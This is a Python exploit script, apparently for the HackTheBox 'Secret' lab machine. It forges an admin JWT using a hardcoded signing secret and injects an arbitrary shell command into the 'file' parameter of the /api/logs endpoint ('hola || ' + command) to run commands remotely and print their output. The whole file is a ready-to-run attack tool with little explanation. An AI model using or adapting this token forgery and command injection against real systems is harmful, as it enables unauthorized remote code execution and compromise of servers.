#!/usr/bin/python3

import requests
import base64
import signal
import sys
import jwt

# - Variables globales
# ----------------------------------------------------------------
URL = "http://10.10.11.120:3000"
secret_token = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
banner = base64.b64decode("CuKVk+KUgOKUgOKVluKVk+KUgOKUgCDilZPilIDilIAg4pWT4pSA4pSA4pWW4pWT4pSA4pSAIOKVk+KUgOKUgOKVlgrilZnilIDilIDilZbilZEgICDilZEgICDilZHilIDilIDilZzilZEgICDilZkg4pWR4pWcCuKVpSAg4pWr4pWr4pSA4pSAIOKVqyAgIOKVq+KUgOKUgOKVluKVq+KUgOKUgCAgIOKVkSAK4pWZ4pSA4pSA4pWc4pWZ4pSA4pSA4pSA4pWZ4pSA4pSA4pSA4pWoICDilajilZnilIDilIDilIAg4pSA4pWoIOKAoiBieSBsYW56CgpIYWNrVGhlQm94IC0gU2VjcmV0IHwgQ29tbWFuZC1JbmplY3Rpb24gLT4gUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uCg==").decode()

s = requests.Session()

# - Clases
# ----------------------------------------------------------------
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# - Funciones
# ----------------------------------------------------------------
def exit2calle(sig, frame):  # controlamos salida forzada
    print(Color.RED + "\nSaliendo amorosamente <3" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def main():  # todo el jugueteo del script
    command = sys.argv[1]

    print("[" + Color.GREEN + "+" + Color.END + "] Ejecutando el comando {0}".format(Color.BLUE + command + Color.END))

    data_post = {
        "_id": "1",
        "name": "theadmin",
        "email": "eladminestatroleando@gmail.com",
        "iat": "1"
    }
    jwt_token = jwt.encode(data_post, secret_token, algorithm="HS256")

    headers = {"auth-token":jwt_token}
    data_get = {"file": "hola || " + command}

    try:
        r = s.get(URL + '/api/logs', params=data_get, headers=headers, timeout=3)
        if "killed" in r.text:
            print("[" + Color.RED + "-" + Color.END + "] Ese comando o no existe o hay problemas internos para ejecutarlo.")
            exit(1)

        command_result = r.text[1:len(r.text)-1] # quitamos el caracter " del inicio y final
        print("\n" + Color.YELLOW + command_result.replace("\\n","\n").replace("\\t","\t") + Color.END)
    except requests.exceptions.Timeout:
        print("[" + Color.GREEN + "+" + Color.END + "] Petición demorada, al parecer el comando se ha ejecutado (:")

    print("[" + Color.GREEN + "+" + Color.END + "] Te vi y no me acuerdo :D")

def print_help():  # mostramos el uso del programa
    print("Uso: {0} <comando>".format(sys.argv[0]))
    print("\nEjemplo:\n  {0} id\n  {0} 'pwd ; whoami'".format(sys.argv[0]))
    exit(1)

# - Inicio del programa
# ----------------------------------------------------------------
if __name__ == "__main__":
    print(banner)

    if len(sys.argv) != 2:
        print_help()

    try:
        requests.get(URL, timeout=3)
    except requests.exceptions.Timeout:
        print("[" + Color.RED + "-" + Color.END + "] No hay conexión contra la máquina, valida la VPN!")
        exit(1)

    main()
